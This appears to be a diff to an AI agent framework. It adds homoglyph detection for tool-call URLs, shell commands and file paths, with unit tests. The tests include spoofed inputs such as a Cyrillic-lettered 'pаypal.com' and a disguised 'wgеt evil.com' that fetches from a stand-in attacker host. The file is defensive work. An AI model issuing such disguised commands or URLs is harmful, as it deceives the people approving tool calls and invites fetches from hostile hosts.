@@ -20,7 +20,10 @@ use std::sync::Arc;
 use std::time::{Duration, SystemTime};
 
 use forge_context::Librarian;
-use forge_types::{ToolDefinition, ToolResult, sanitize_terminal_text, strip_steganographic_chars};
+use forge_types::{
+    HomoglyphWarning, ToolDefinition, ToolResult, detect_mixed_script, sanitize_terminal_text,
+    strip_steganographic_chars,
+};
 use jsonschema::JSONSchema;
 use serde_json::Value;
 use tokio::sync::{Mutex, mpsc};
@@ -87,6 +90,36 @@ pub struct ConfirmationRequest {
     pub summary: String,
     pub risk_level: RiskLevel,
     pub arguments: Value,
+    /// Homoglyph warnings detected in tool arguments.
+    /// Existence of warnings proves analysis was performed and found issues.
+    pub warnings: Vec<HomoglyphWarning>,
+}
+
+/// Analyze tool arguments for homoglyphs (BOUNDARY per IFA-11).
+///
+/// Returns proof objects for any detected issues. This analysis happens
+/// at the boundary when preparing approval requests.
+#[must_use]
+pub fn analyze_tool_arguments(tool_name: &str, args: &Value) -> Vec<HomoglyphWarning> {
+    let mut warnings = Vec::new();
+
+    // High-risk fields by tool type
+    let fields_to_check: &[&str] = match tool_name {
+        "WebFetch" | "web_fetch" => &["url"],
+        "Run" | "Pwsh" | "run" | "shell" | "bash" | "pwsh" => &["command"],
+        "Read" | "Write" | "Edit" | "read" | "write" | "edit" | "patch" => &["path", "file_path"],
+        _ => &[],
+    };
+
+    for field in fields_to_check {
+        if let Some(value) = args.get(field).and_then(|v| v.as_str())
+            && let Some(warning) = detect_mixed_script(value, field)
+        {
+            warnings.push(warning);
+        }
+    }
+
+    warnings
 }
 
 /// Planned disposition for a tool call.
@@ -448,4 +481,72 @@ pub fn redact_distillate(raw: &str) -> String {
         output.push(ch);
     }
     output
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use serde_json::json;
+
+    #[test]
+    fn analyze_tool_arguments_detects_webfetch_url() {
+        // Cyrillic 'а' (U+0430) looks like Latin 'a'
+        let args = json!({"url": "https://pаypal.com"});
+        let warnings = analyze_tool_arguments("WebFetch", &args);
+        assert_eq!(warnings.len(), 1);
+        assert_eq!(warnings[0].field_name, "url");
+    }
+
+    #[test]
+    fn analyze_tool_arguments_detects_run_command() {
+        // Cyrillic 'е' (U+0435) looks like Latin 'e'
+        let args = json!({"command": "wgеt evil.com"});
+        let warnings = analyze_tool_arguments("Run", &args);
+        assert_eq!(warnings.len(), 1);
+        assert_eq!(warnings[0].field_name, "command");
+    }
+
+    #[test]
+    fn analyze_tool_arguments_detects_shell_command() {
+        let args = json!({"command": "curl gооgle.com"});
+        let warnings = analyze_tool_arguments("shell", &args);
+        assert_eq!(warnings.len(), 1);
+    }
+
+    #[test]
+    fn analyze_tool_arguments_detects_edit_path() {
+        // Path with Cyrillic character
+        let args = json!({"file_path": "/tmp/tеst.py"});
+        let warnings = analyze_tool_arguments("Edit", &args);
+        assert_eq!(warnings.len(), 1);
+        assert_eq!(warnings[0].field_name, "file_path");
+    }
+
+    #[test]
+    fn analyze_tool_arguments_clean_webfetch_url() {
+        let args = json!({"url": "https://google.com"});
+        let warnings = analyze_tool_arguments("WebFetch", &args);
+        assert!(warnings.is_empty());
+    }
+
+    #[test]
+    fn analyze_tool_arguments_ignores_untracked_tools() {
+        let args = json!({"url": "https://pаypal.com"});
+        let warnings = analyze_tool_arguments("UnknownTool", &args);
+        assert!(warnings.is_empty());
+    }
+
+    #[test]
+    fn analyze_tool_arguments_handles_missing_field() {
+        let args = json!({"other_field": "value"});
+        let warnings = analyze_tool_arguments("WebFetch", &args);
+        assert!(warnings.is_empty());
+    }
+
+    #[test]
+    fn analyze_tool_arguments_handles_non_string_field() {
+        let args = json!({"url": 123});
+        let warnings = analyze_tool_arguments("WebFetch", &args);
+        assert!(warnings.is_empty());
+    }
 }
